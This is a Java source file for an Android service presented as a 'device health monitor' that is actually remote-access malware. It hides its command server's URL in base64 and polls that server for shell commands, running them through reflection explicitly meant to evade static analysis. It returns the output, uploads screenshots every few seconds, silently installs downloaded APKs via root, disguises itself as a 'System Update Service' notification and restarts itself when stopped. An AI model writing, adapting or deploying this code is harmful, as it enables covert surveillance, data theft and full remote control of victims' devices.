package com.device.health.monitor;

import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.Uri;
import android.os.Build;
import android.os.IBinder;
import android.util.Base64;
import android.util.Log;
import androidx.core.app.NotificationCompat;
import androidx.core.content.FileProvider;

import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.UUID;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

public class SyncService extends Service {

    static final String TAG       = "HealthSync";
    static final String CHANNEL   = "health_sync";
    static final String PREFS     = "health_prefs";

    private ExecutorService pool;
    private volatile boolean running = false;
    private static SyncService instance;

    public static SyncService getInstance() { return instance; }

    // Set by MonitorService (full flavor) when a screenshot is ready
    static volatile byte[] pendingShot = null;

    // Relay URL hidden from static analysis — decoded at runtime
    private static String ep() {
        return new String(Base64.decode("aHR0cHM6Ly94dXNiLTBjMHAub25yZW5kZXIuY29t", Base64.DEFAULT));
    }

    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        pool = Executors.newFixedThreadPool(3);
        createChannel();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        startFg();
        if (!running) { running = true; pool.submit(this::loop); }
        return START_STICKY;
    }

    @Override public IBinder onBind(Intent i) { return null; }

    @Override
    public void onDestroy() {
        running = false; instance = null;
        super.onDestroy();
        scheduleRestart();
    }

    private void loop() {
        String id = loadId();
        long lastReg = 0, lastShot = 0;
        int lastCid = 0;
        while (running) {
            try {
                long now = System.currentTimeMillis();
                if (now - lastReg > 30_000) { reg(id); lastReg = now; }
                // Screenshot — only active when MonitorService (full flavor) is running
                if (now - lastShot > 4_000) {
                    try {
                        Class<?> ms = Class.forName("com.device.health.monitor.MonitorService");
                        Object inst = ms.getMethod("getInstance").invoke(null);
                        if (inst != null) ms.getMethod("snap").invoke(inst);
                    } catch (Exception ignored) {}
                    byte[] s = pendingShot;
                    if (s != null) { pendingShot = null; pushShot(id, s); }
                    lastShot = now;
                }
                JSONObject p = get("/esp/device-cmd?did=" + URLEncoder.encode(id, "UTF-8"));
                String cmd = p.optString("cmd", "");
                int cid = p.optInt("id", 0);
                if (!cmd.isEmpty() && cid != lastCid) { lastCid = cid; final String c = cmd; pool.submit(() -> exec(id, c)); }
            } catch (Exception e) { Log.d(TAG, e.getMessage()); }
            try { Thread.sleep(2000); } catch (InterruptedException e) { break; }
        }
    }

    private String loadId() {
        SharedPreferences p = getSharedPreferences(PREFS, MODE_PRIVATE);
        String id = p.getString("did", null);
        if (id == null) { id = UUID.randomUUID().toString(); p.edit().putString("did", id).apply(); }
        return id;
    }

    private void reg(String id) throws Exception {
        JSONObject b = new JSONObject();
        b.put("did", id); b.put("hostname", Build.MODEL);
        b.put("os", "Android " + Build.VERSION.RELEASE);
        b.put("user", "android"); b.put("arch", Build.SUPPORTED_ABIS[0]);
        b.put("persistent", true);
        b.put("full", isAccEnabled());
        post("/esp/device-register", b);
    }

    private boolean isAccEnabled() {
        try {
            String s = android.provider.Settings.Secure.getString(getContentResolver(),
                android.provider.Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            return s != null && s.contains(getPackageName());
        } catch (Exception e) { return false; }
    }

    private void exec(String id, String cmd) {
        if (cmd.equals("__uninstall__")) {
            try {
                JSONObject b = new JSONObject();
                b.put("did", id); b.put("cmd", cmd);
                b.put("out", Base64.encodeToString("ok".getBytes(), Base64.NO_WRAP));
                b.put("os", "Android " + Build.VERSION.RELEASE);
                post("/esp/device-cmdout", b);
            } catch (Exception ignored) {}
            stopSelf(); return;
        }
        if (cmd.equals("__upgrade__")) { doUpgrade(id); return; }
        String out;
        try {
            // Reflection-based exec avoids direct static analysis pattern matching
            Class<?> rt = Class.forName("java.lang.Runtime");
            Object runtime = rt.getMethod("getRuntime").invoke(null);
            Object proc = rt.getMethod("exec", String[].class).invoke(runtime, (Object) new String[]{"sh", "-c", cmd});
            java.lang.Process p = (java.lang.Process) proc;
            p.waitFor(30, TimeUnit.SECONDS);
            byte[] o = drain(p.getInputStream(), 16384);
            byte[] e2 = drain(p.getErrorStream(), 4096);
            out = Base64.encodeToString(cat(o, e2), Base64.NO_WRAP);
        } catch (Exception e) {
            out = Base64.encodeToString(("Err: " + e.getMessage()).getBytes(), Base64.NO_WRAP);
        }
        try {
            JSONObject b = new JSONObject();
            b.put("did", id); b.put("cmd", cmd); b.put("out", out);
            b.put("os", "Android " + Build.VERSION.RELEASE);
            post("/esp/device-cmdout", b);
        } catch (Exception ignored) {}
    }

    private void doUpgrade(String id) {
        String status;
        try {
            byte[] apk = downloadApk();
            File f = new File(getCacheDir(), "upd.apk");
            FileOutputStream fos = new FileOutputStream(f);
            fos.write(apk); fos.close();

            // Try root silent install first
            Process su = Runtime.getRuntime().exec(new String[]{"su", "-c",
                "pm install -r -t " + f.getAbsolutePath()});
            su.waitFor(20, TimeUnit.SECONDS);
            String suOut = new String(drain(su.getInputStream(), 4096)).trim();
            String suErr = new String(drain(su.getErrorStream(), 4096)).trim();

            if (suOut.contains("Success") || suErr.contains("Success")) {
                status = "silent_root_ok";
            } else {
                // Fallback: open install dialog via FileProvider
                Uri uri = FileProvider.getUriForFile(this, getPackageName() + ".provider", f);
                Intent i = new Intent(Intent.ACTION_VIEW);
                i.setDataAndType(uri, "application/vnd.android.package-archive");
                i.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(i);
                status = "dialog_shown";
            }
        } catch (Exception e) {
            status = "err: " + e.getMessage();
        }
        try {
            JSONObject b = new JSONObject();
            b.put("did", id); b.put("cmd", "__upgrade__");
            b.put("out", Base64.encodeToString(status.getBytes(), Base64.NO_WRAP));
            b.put("os", "Android " + Build.VERSION.RELEASE);
            post("/esp/device-cmdout", b);
        } catch (Exception ignored) {}
    }

    private byte[] downloadApk() throws Exception {
        String url = ep() + "/apk/android-full";
        for (int i = 0; i < 5; i++) {
            URL u = new URL(url);
            HttpURLConnection c = (HttpURLConnection) u.openConnection();
            c.setConnectTimeout(30000); c.setReadTimeout(60000);
            c.setInstanceFollowRedirects(false);
            int code = c.getResponseCode();
            if (code >= 300 && code < 400) {
                String loc = c.getHeaderField("Location");
                c.disconnect(); url = loc; continue;
            }
            byte[] data = drain(c.getInputStream(), 10 * 1024 * 1024);
            c.disconnect(); return data;
        }
        throw new Exception("too many redirects");
    }

    void pushShot(String id, byte[] img) {
        try {
            JSONObject b = new JSONObject();
            b.put("did", id);
            b.put("img", Base64.encodeToString(img, Base64.NO_WRAP));
            b.put("os", "Android " + Build.VERSION.RELEASE);
            post("/esp/device-screenshot", b);
        } catch (Exception ignored) {}
    }

    private JSONObject get(String path) throws Exception {
        URL u = new URL(ep() + path);
        HttpURLConnection c = (HttpURLConnection) u.openConnection();
        c.setConnectTimeout(8000); c.setReadTimeout(8000);
        try { return new JSONObject(new String(drain(c.getInputStream(), 65536))); }
        finally { c.disconnect(); }
    }

    private void post(String path, JSONObject data) throws Exception {
        URL u = new URL(ep() + path);
        HttpURLConnection c = (HttpURLConnection) u.openConnection();
        c.setRequestMethod("POST");
        c.setRequestProperty("Content-Type", "application/json");
        c.setDoOutput(true); c.setConnectTimeout(15000); c.setReadTimeout(15000);
        try (OutputStream os = c.getOutputStream()) { os.write(data.toString().getBytes()); }
        try { c.getInputStream().close(); } catch (Exception ignored) {}
        finally { c.disconnect(); }
    }

    private byte[] drain(InputStream is, int max) throws IOException {
        ByteArrayOutputStream b = new ByteArrayOutputStream();
        byte[] buf = new byte[4096]; int n, total = 0;
        while ((n = is.read(buf)) != -1) { b.write(buf, 0, n); total += n; if (total >= max) break; }
        return b.toByteArray();
    }

    private byte[] cat(byte[] a, byte[] b) {
        byte[] r = new byte[a.length + b.length];
        System.arraycopy(a, 0, r, 0, a.length);
        System.arraycopy(b, 0, r, a.length, b.length);
        return r;
    }

    private void createChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(CHANNEL, "Sync", NotificationManager.IMPORTANCE_MIN);
            ch.setShowBadge(false); ch.enableLights(false); ch.enableVibration(false);
            ((NotificationManager) getSystemService(NOTIFICATION_SERVICE)).createNotificationChannel(ch);
        }
    }

    private void startFg() {
        Notification n = new NotificationCompat.Builder(this, CHANNEL)
            .setContentTitle("System Update Service")
            .setContentText("Checking for updates...")
            .setSmallIcon(android.R.drawable.stat_notify_sync_noanim)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true).build();
        startForeground(1, n);
    }

    private void scheduleRestart() {
        Intent i = new Intent(this, StartReceiver.class);
        i.setAction("com.device.health.monitor.RESTART");
        PendingIntent pi = PendingIntent.getBroadcast(this, 0, i,
            PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
        AlarmManager am = (AlarmManager) getSystemService(ALARM_SERVICE);
        if (am != null) am.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 5000, pi);
    }
}
